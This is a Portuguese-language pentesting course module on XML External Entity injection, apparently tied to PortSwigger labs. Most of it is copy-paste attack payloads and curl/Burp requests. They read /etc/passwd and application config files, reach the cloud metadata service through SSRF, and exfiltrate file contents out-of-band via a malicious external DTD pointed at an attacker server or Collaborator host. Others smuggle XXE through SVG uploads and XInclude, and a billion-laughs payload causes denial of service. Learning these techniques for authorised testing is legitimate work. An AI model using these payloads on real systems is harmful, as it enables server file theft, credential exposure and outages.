# 📄 07. XXE — XML External Entity Injection

> XML parece inofensivo, mas quando uma aplicação parseia XML sem sanitização, você pode ler arquivos, executar SSRF e até RCE.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 60min | ⭐⭐⭐ Avançado | `curl, Burp Repeater, XXEinjector` |

</div>

---

## 🎓 Por que isso importa?

XXE (XML External Entity) ocorre quando uma aplicação parseia XML com **external entities habilitadas**. Isso permite que o atacante defina entidades que referenciem arquivos locais, URLs internas, ou recursos externos.

**Analogia:** Imagine que você entrega uma carta para o porteiro e pede: "Leia o conteúdo da pasta X na sala do diretor". O porteiro lê e te devolve — porque confia que a carta é legítima.

**Impacto real:**
- Ler arquivos sensíveis: `/etc/passwd`, `/etc/shadow`, configurações
- SSRF via XXE (buscar serviços internos)
- DoS via billion laughs attack
- RCE via XXE em alguns parsers (PHP, Java)
- Exfiltração de dados via Blind XXE + OOB

**OWASP 2025:** Mapeado em **A01:2025 Broken Access Control**

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| XML básico (tags, attributes, DTD) | Sim | Este arquivo explica |
| HTTP basics | Sim | Módulo 00 |
| Burp Suite (Repeater) | Sim | Arquivo 01 deste módulo |

---

## 🎯 Quando usar XXE

- Quando a aplicação aceita **input XML** (SOAP APIs, upload de XML, RSS feeds)
- Quando existe **content-type: application/xml** em requests
- Para ler arquivos locais do servidor
- Para fazer SSRF via XXE
- Para encadear com **file upload** (SVG contém XML)
- Para ataques **blind** quando a resposta não é retornada

---

## 🔄 Como funciona na prática

```
┌──────────────┐         ┌──────────────────┐         ┌──────────────┐
│   Atacante   │ ──XML──►│   App Web        │ ──parse─►│  Servidor    │
│              │         │  (parser XML)    │         │              │
└──────────────┘         └──────────────────┘         └──────────────┘
                                │
                                ▊ External Entity:
                                ▊ <!DOCTYPE foo [
                                ▊   <!ENTITY xxe SYSTEM "file:///etc/passwd">
                                ▊ ]>
                                ▊ <foo>&xxe;</foo>
                                ▼
                         ┌──────────────┐
                         │  Conteúdo do │
                         │  arquivo     │
                         │  exposto no  │
                         │  response    │
                         └──────────────┘
```

---

## 📝 Tipos de XXE

### 1. XXE Clássico (resposta visível)

O conteúdo da entidade externa aparece na resposta.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Output esperado:**
```xml
<user>
  <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</name>
</user>
```

### 2. Blind XXE (resposta invisível)

A aplicação não retorna o conteúdo da entidade. Usar **OOB (Out-of-Band)** para exfiltrar dados.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net">
]>
<user>
  <name>&xxe;</name>
</user>
```

O servidor faz request para seu Collaborator → confirma XXE.

### 3. Blind XXE com Exfiltração via DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<user>
  <name>test</name>
</user>
```

**evil.dtd (no seu servidor):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-COLLABORATOR-ID.burpcollaborator.net/?data=%file;'>">
%all;
```

### 4. XXE via SVG Upload

Arquivos SVG são XML. Se a app aceita SVG e parseia o conteúdo:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### 5. XXE via Content-Type

```bash
# Forçar parsing XML mudando Content-Type
POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>&xxe;</request>
```

### 6. XInclude Attack

Quando não é possível declarar DOCTYPE (a app rejeita):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 📋 DTDs Maliciosos Comuns

### Ler Arquivos

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Blind XXE com Parameter Entity

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &percnt; exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
  %eval;
  %exfil;
]>
<foo>test</foo>
```

### Billion Laughs (DoS)

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

---

## 📝 Exemplos Práticos

### Exemplo 1: XXE Clássico via curl

```bash
# Enviar XML com external entity
curl -X POST http://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>'

# Output esperado se XXE existe:
# <user>
#   <name>root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# </name>
#   <email>test@test.com</email>
# </user>
```

### Exemplo 2: XXE via Burp Repeater

```bash
# 1. Capturar request que aceita XML
# 2. Enviar para Repeater (Ctrl+R)
# 3. Modificar o body:

POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml
Cookie: session=abc123

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>

# 4. Enviar
# 5. Response mostra conteúdo de /etc/passwd → XXE confirmado
```

### Exemplo 3: XXE via SVG Upload

```bash
# 1. Criar SVG malicioso
cat > payload.svg << 'EOF'
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="20">&xxe;</text>
</svg>
EOF

# 2. Upload do SVG via Burp
# Intercept → Upload de arquivo → substituir conteúdo pelo payload
# Content-Type: image/svg+xml

# 3. Acessar SVG via URL
curl http://target.com/uploads/payload.svg
# Output: conteúdo de /etc/passwd renderizado no SVG
```

### Exemplo 4: Blind XXE via Collaborator

```bash
# 1. Burp → Burp Collaborator → Copy to clipboard
# 2. Enviar request:

POST /api/parse HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-ID.burpcollaborator.net">
]>
<user>&xxe;</user>

# 3. Poll now no Collaborator
# 4. Se receber request → Blind XXE confirmado
```

### Exemplo 5: Ler Configurações

```bash
# Testar arquivos comuns de configuração
file:///etc/passwd
file:///etc/hostname
file:///proc/version
file:///proc/self/environ
file:///var/www/html/config.php
file:///var/www/html/web.config
file:///etc/apache2/apache2.conf

# XML via curl
curl -X POST http://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<config>&xxe;</config>'
```

---

## 🔄 Fluxo de Teste XXE

```
┌─────────────────────────────────────────────────────────┐
│  1. IDENTIFICAR INPUTS XML                               │
│     - Procurar Content-Type: application/xml             │
│     - Procurar SOAP endpoints                            │
│     - Testar upload de XML/SVG                           │
│     - Mudar Content-Type para application/xml            │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. TESTAR XXE CLÁSSICO                                  │
│     - Enviar DOCTYPE com entity para file:///etc/passwd  │
│     - Se retornar conteúdo → XXE confirmado              │
│     - Testar diferentes caminhos de arquivos             │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. TESTAR BLIND XXE                                     │
│     - Entity apontando para Collaborator                 │
│     - Se Collaborator receber request → XXE confirmado   │
│     - Usar parameter entities para exfiltração           │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. EXFILTRAR DADOS                                      │
│     - DTD externo para enviar dados via HTTP             │
│     - file:///etc/passwd → http://attacker.com/?data=    │
│     - Ler configurações, chaves, tokens                  │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. ENCADEAR COM OUTRAS VULNERABILIDADES                 │
│     - XXE + SSRF (cloud metadata)                        │
│     - XXE + RCE (PHP expect://)                          │
│     - XXE + File Upload (SVG)                            │
│     - XXE + DoS (billion laughs)                         │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "App não aceita DOCTYPE" | Usar XInclude ou parameter entities em vez de DOCTYPE |
| "Não vejo a resposta" | É Blind XXE → usar Collaborator ou OOB exfiltração |
| "SVG não renderiza" | Upload pode não parsear → testar com diferentes content-types |
| "Erro de parsing" | Verificar sintaxe XML (tags fechadas, encoding) |
| "PHP não funciona" | PHP desabilitou external entities por padrão (libxml_disable_entity_loader) |
| "Não sei se é XXE" | Testar primeiro com `<!ENTITY xxe SYSTEM "file:///etc/hostname">` |

---

## 📋 Cheat Sheet Rápido

### Payloads Prontos (copiar e colar)

```xml
<!-- XXE Clássico - Ler /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- XInclude (sem DOCTYPE) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- Blind XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net">
]>
<root>&xxe;</root>
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) | XXE básico, file read | 10min |
| 2 | PortSwigger | [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) | XXE + SSRF | 10min |
| 3 | PortSwigger | [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction) | Blind XXE, Collaborator | 15min |
| 4 | PortSwigger | [Blind XXE with parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities) | Parameter entities | 20min |
| 5 | PortSwigger | [XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | SVG upload XXE | 15min |
| 6 | PortSwigger | [XInclude attack](https://portswigger.net/web-security/xxe/lab-xinclude-attack) | XInclude sem DOCTYPE | 10min |

---

## 📚 Referências

- [PortSwigger — XXE](https://portswigger.net/web-security/xxe)
- [PortSwigger — XXE Labs](https://portswigger.net/web-security/xxe)
- [OWASP — XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [HackTricks — XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayloadsAllTheThings — XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [XXEinjector](https://github.com/ianxtianxt/XXEinjector)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Identificar endpoints que aceitam XML
- [ ] Criar payload de XXE clássico para ler arquivos
- [ ] Executar SSRF via XXE
- [ ] Detectar Blind XXE usando Collaborator
- [ ] Fazer exfiltração de dados via Blind XXE + OOB
- [ ] Explorar XXE via SVG upload
- [ ] Usar XInclude quando DOCTYPE é bloqueado
- [ ] Bypassar proteções de XXE em diferentes parsers
- [ ] Encadear XXE com SSRF e file upload
- [ ] Completar todos os labs PortSwigger de XXE
